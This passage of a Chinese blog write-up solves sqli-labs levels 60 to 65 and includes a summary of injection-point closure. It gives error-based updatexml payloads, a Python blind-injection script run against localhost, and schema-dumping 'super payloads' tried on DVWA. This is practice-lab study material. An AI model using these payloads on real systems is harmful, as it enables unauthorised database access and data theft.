class="hljs-meta">O03</span>oqzMhxJSBwrp<br></code></pre></td></tr></table></figure><h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;)%23<br></code></pre></td></tr></table></figure><p>表名</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">H<span class="hljs-number">0</span><span class="hljs-symbol">NBLL5</span>CGP<br></code></pre></td></tr></table></figure><p>字段名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;) union select 1,2,3 <span class="hljs-keyword">AND</span> updatexml(1,concat(0x7e,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;H0NBLL5CGP&#x27;</span>),0x7e),1)%23<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">secret_8RQ5<br></code></pre></td></tr></table></figure><p>key</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_8RQ5) <span class="hljs-keyword">from</span> <span class="hljs-symbol">`H0NBLL5CGP`</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rDktDmwezZTBsJMuXYdvbwGT</span><br></code></pre></td></tr></table></figure><h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;))<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>表名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">U76MT1471B<br></code></pre></td></tr></table></figure><p>字段</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-function">AND <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;U76MT1471B&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">secret_Y380<br></code></pre></td></tr></table></figure><p>key</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_Y380) <span class="hljs-keyword">from</span> <span class="hljs-symbol">`U76MT1471B`</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">Q0AkPbVJH0TwTF8CIi7B2gwt<br></code></pre></td></tr></table></figure><h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>没有报错注入</p><p>union select 也没有想要的结果</p><p>看来只能盲注了</p><p>这是false的时候</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121173940829.png" alt="image-20210121173940829"></p><p>这是true的时候</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121174009901.png" alt="image-20210121174009901"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>session = requests.session()<br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-62/&quot;</span><br>what_i_want = <span class="hljs-string">&quot;&quot;</span><br>table_name = <span class="hljs-string">&quot;&quot;</span><br>column_name = <span class="hljs-string">&quot;&quot;</span><br>key = <span class="hljs-string">&quot;&quot;</span><br>count = <span class="hljs-number">0</span><br>text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1&#x27;) and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;table_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    table_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(table_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved table_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(table_name)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1&#x27;) and ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(table_name,i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;column_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    column_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(column_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> re<br>pattern = <span class="hljs-string">&quot;secret_....&quot;</span><br>column_name = re.findall(pattern,column_name)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved column_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(column_name)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1&#x27;) and ascii(mid((select group_concat(&#123;&#125;) from challenges.&#123;&#125;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(column_name,table_name,i,mid)<br>        <span class="hljs-built_in">print</span>(payload)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-comment">#print(resp.text)</span><br>        <span class="hljs-comment"># if mid==79:</span><br>        <span class="hljs-comment">#     print(resp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    key+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(key)<br>    count = <span class="hljs-number">0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is your loved key!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(key)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121230005217.png" alt="image-20210121230005217"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">zmqPWuhaQ6aWMJdissqGxwMk<br></code></pre></td></tr></table></figure><h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>报错不回显，可以布尔盲注</p><p>稍微修改上局的脚本接着用</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121230738448.png" alt="image-20210121230738448"></p><h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1))%23<br></code></pre></td></tr></table></figure><p>同样是布尔盲注</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121231306768.png" alt="image-20210121231306768"></p><h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;)%23<br></code></pre></td></tr></table></figure><p>还是布尔盲注</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210121231643079.png" alt="image-20210121231643079"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><p>感觉闭合这个考点在这套题里面比较多见，这里做一个小小总结</p><p>select 语句，注入点的闭合，会用到以下几个符号</p><ul><li>单引号  <code>&#39;</code></li><li>双引号  <code>&quot;</code></li><li>圆括号  <code>)</code></li></ul><p>而闭合的方式会有以下几种</p><ul><li><p>无闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$id</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>单引号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; . $id . &#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>双引号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; . $id . &#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>括号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$id</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>混合闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(((<span class="hljs-subst">$id</span>))) LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>以上情况为，双引号+三对括号</p></blockquote></li></ul><p>面对这样的注入点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nhann.top:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<br></code></pre></td></tr></table></figure><p>我们的第一步往往是闭合</p><p>像这样</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://inhann.top:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">4</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nhann.top:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nhann.top:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://inhann.top:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">4</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>在一定情况下，可以用下面pdf中所示的步骤完成闭合</p><p>不过还是得先明确以下所述闭合手段的局限性</p><blockquote><ul><li>id几乎直接放到select语句中，最多被escape了</li><li>发生syntax error的时候可以辨认</li></ul></blockquote><p>简单的情况下，先两个引号都试试，看看报没报错，都报错就说明没用到引号</p><p>然后加注释，加了注释还报错了，说明用到了括号</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入威力巨大</p><p>这里分享几个payload</p><h3 id="超级payload"><a href="#超级payload" class="headerlink" title="超级payload"></a>超级payload</h3><p>分享几个用得很爽的payload</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">select</span>(<span class="hljs-name">@:=0x00</span>),(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">information_schema.columns</span>) where (<span class="hljs-name">table_schema&gt;=@</span>) and (<span class="hljs-name">@</span>)in (<span class="hljs-name">@:=concat</span>(<span class="hljs-name">@</span>,<span class="hljs-number">0</span>x0D,<span class="hljs-number">0</span>x0A,&#x27; [ &#x27;,table_schema,&#x27; ] &gt; &#x27;,table_name,&#x27; &gt; &#x27;,column_name,<span class="hljs-number">0</span>x7C))))a)<br></code></pre></td></tr></table></figure><p>及其一般形式</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">select</span>(<span class="hljs-name">@:=0x00</span>),(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">db_data.table_data</span>) where (<span class="hljs-name">@</span>)in (<span class="hljs-name">@:=concat</span>(<span class="hljs-name">@</span>,<span class="hljs-number">0</span>x0D,<span class="hljs-number">0</span>x0A,<span class="hljs-number">0</span>x7C,&#x27; [ &#x27;,column_data1,&#x27; ] &gt; &#x27;,column_data2,&#x27; &gt; &#x27;,<span class="hljs-number">0</span>x7C))))a)<br></code></pre></td></tr></table></figure><ul><li>dvwa low</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//localhost/dvwa/vulnerabilities/sqli/?id<span class="hljs-operator">=</span>&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (<span class="hljs-keyword">select</span>(<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x00</span>)<span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (information_schema.columns) where (table_schema&gt;<span class="hljs-operator">=</span><span class="hljs-title">@p</span>) <span class="hljs-keyword">and</span> (<span class="hljs-title">@p</span>)in (<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span>concat(<span class="hljs-title">@p</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0D</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0A</span><span class="hljs-punctuation">,</span>&#x27; [ &#x27;<span class="hljs-punctuation">,</span>table_schema<span class="hljs-punctuation">,</span>&#x27; ] &gt; &#x27;<span class="hljs-punctuation">,</span>table_name<span class="hljs-punctuation">,</span>&#x27; &gt; &#x27;<span class="hljs-punctuation">,</span>column_name<span class="hljs-punctuation">,</span><span class="hljs-number">0x7C</span>))))a))<span class="hljs-variable">%23</span>&amp;Submit<span class="hljs-operator">=</span>Submit#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/php/blog/2021/01/image-20210130201015071.png" alt="image-20210130201015071"></p><ul><li>dvwa medium</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-variable">@p</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(<span class="hljs-variable">@p</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (<span class="hljs-variable">@p</span>) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema<span class="hljs-operator">&gt;=</span><span class="hljs-variable">@p</span>) <span class="hljs-keyword">and</span> (<span class="hljs-variable">@p</span>)<span class="hljs-keyword">in</span> (<span class="hljs-variable">@p</span>:<span class="hljs-operator">=</span>concat(<span class="hljs-variable">@p</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x5b</span>,table_schema,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x3e</span>,table_name,<span class="hljs-number">0x3e</span>,column_name,<span class="hljs-number">0x7C</span>))))a))<span class="hljs-operator">%</span><span class="hljs-number">23</span><span 